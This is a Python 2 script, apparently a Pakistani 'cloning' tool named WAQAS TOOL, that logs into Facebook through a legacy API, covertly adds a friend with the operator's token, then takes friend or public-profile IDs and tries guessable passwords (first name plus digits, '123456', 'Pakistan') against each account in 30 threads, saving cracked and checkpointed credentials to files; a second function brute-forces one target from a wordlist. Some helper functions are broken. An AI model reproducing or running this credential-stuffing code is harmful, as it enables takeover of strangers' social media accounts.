#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00.1)


##### LOGO #####
logo = """
\033[1;92m ♦♦♦———————————————————————————————♦♦♦
\033[1;91m  , ＜￣｀ヽ、　　　　　　／￣＞
\033[1;92m  　ゝ、　　＼　／⌒ヽ,ノ 　/´
\033[1;93m  　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／        WhatsApp
\033[1;94m WAQAS　>　 　 　,).             +923170424820
\033[1;95m  　　　　　∠_,,,/.  
\033[1;92m ♦♦♦———————————————————————————————♦♦♦
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;92m ♥♥♥♥¸.•°*”˜˜”*°•. ♥♥♥♥........
\033[1;93m ─▄████▄─▄████▄♥~✿.｡.💚
\033[1;94m ▐▀████████████▌♥~✿.｡.💚
\033[1;95m ▐█▄▓██████████▌♥~✿.｡.💚
\033[1;96m ─▀███████████▀♥~✿.｡.💚
\033[1;97m ───▀███████▀♥~✿.｡.💚
\033[1;91m ─────▀███▀♥~✿.｡.💚
\033[1;92m ───────█♥~✿.｡.💚
\033[1;93m ───────♥~✿.｡.(｡💚
                                                               

"""

jalan("\033[1;97m•◈•───────•◈ MR WAQAS•◈•───────•◈•")  

 
jalan("   \033[1;91m INDAIN USERZ USE ANY PROXY ")	
jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	

jalan("   \033[1;93m Welcome to WAQAS TOOL ")

jalan("\033[1;97m•◈•──────────•◈•\033[1;96mWAQAS\033[1;96m•◈•──────────•◈•")

CorrectUsername = "waqas"
CorrectPassword = "waqas"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;97mTool username \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;97mPassword\x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://chat.whatsapp.com/Bgi6jhqCBWkL5cvggcqIiG')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.Youtube.com')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 50*"\033[1;96m▪"
		
		
		print('          \033[1;97m[◉] \x1b[1;96mLogin New Fresh Account \033[1;97m[◉]' )
		id = raw_input('          \033[1;97m[◉] \033[1;97mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('          \033[1;97m[◉] \033[1;97mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful...'
				os.system('xdg-open https://chat.whatsapp.com/Bgi6jhqCBWkL5cvggcqIiG')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;97m[!] There is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[!] Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;97mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
	print "\033[1;32;40m[2] \033[1;33;40m══Update WAQAS"																														
	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\033[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;97mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\033[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;95m[✺] Getting IDs \033[1;95m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[✺] Name : "+op["name"]
		except KeyError:
			print"\033[1;97m[✺] ID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\033[1;97m[+] \033[1;97mEnter the file name \033[1;97m: \033[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;97mFill in correctly"
		pilih_super()

	
	print "\033[1;36;40m[✺] Total IDs : \033[1;95m"+str(len(id))
	jalan('\033[1;34;40m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] 03170424820\033[1;95m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;95m        ❈     \033[1;95mTo Stop Process Press CTRL+Z \033[1;95m    ❈"
	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"

	jalan('                                         \033[1;95mcp id open 7day start cloning Wait...')
	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 

	for o in titik:
		print("\r\033[1;32;40m[✺] Cloning\033[1;95m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;95m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;95m    ❈"
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[!] \x1b[1;92m[OK]'											
				print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
				print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
				    print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b ['name']
				    print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				    print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;94m[!] \x1b[1;92m[OK]'											
				            print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				            print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user								
				            print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;94m[!] \x1b[1;96m[Checkpoint]'
				               print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;93m    : \x1b[1;97m' + b['name']
				               print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				               print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[!] \x1b[1;92m[OK]'								
						       print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']									
						       print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user							
						       print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
				                           print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                           print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                           print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '1122'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[!] \x1b[1;92m[OK]'											
				                                   print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                   print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
				                                   print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;94m[!] \x1b[1;96m[Checkpoint]'
				                                       print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                       print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                       print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;97m[!] \x1b[1;92m[OK]'						
						                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']							
						                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user					
						                               print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                   print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				                                                           print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                                           print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user									
				                                                           print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                               print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[!] \x1b[1;92m[OK]'					
									                               print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']					
									                               print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user				
									                               print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
				                                                                           print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                           print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                                           print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = '123456'									
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user										
				                                                                                   print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;98m      : \x1b[1;97m' + user
				                                                                                       print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[!] \x1b[1;92m[OK]'			
											                                       print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']			
											                                       print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user	
											                                       print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
				                                                                                                   print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                                                   print '\x1b[1;94m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                                                                   print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
																	                                             
															
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;95m....'
	print "\033[1;32;40m[+] Total OK/\033[1;95mCP \033[1;97m: \033[1;95m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	print """
\033[1;31;40m ●════════════════════════◄►════════════════════════●
           """
	raw_input("\n\033[1;95m[\033[1;95mExit\033[1;95m]")
	super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;97m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
        try:
            email = raw_input('\033[1;95m[+] \033[1;95mID\033[1;95m/\033[1;95mEmail \033[1;95mTarget \033[1;95m:\033[1;95m ')
            passw = raw_input('\033[1;95m[+] \033[1;95mWordlist \033[1;95mext(list.txt) \033[1;95m: \033[1;95m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\033[1;95m[\033[1;95m\xe2\x9c\x93\033[1;95m] \033[1;95mTarget \033[1;95m:\033[1;95m ' + email
            print '\033[1;95m[+] \033[1;95mTotal\033[1;95m ' + str(len(total)) + ' \033[1;97mPassword'
            jalan('\033[1;95m[\xe2\x9c\xba] \033[1;95mPlease wait \033[1;95m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[1;97m[\033[1;97m\xe2\x9c\xb8\033[1;97m] \033[1;97mTry \033[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\033[1;97m[+] \033[1;97mFounded.'
                        print 52 * '\033[1;97m\xe2\x95\x90'
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\033[1;97m[+] \033[1;97mFounded.'
                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                            print '\033[1;97m[!] \033[1;97mAccount Maybe Checkpoint'
                            print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                            print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\033[1;97m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\033[1;97m[!] File not found...'
            print """\n\033[1;97m[!] \033[1;97mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login()
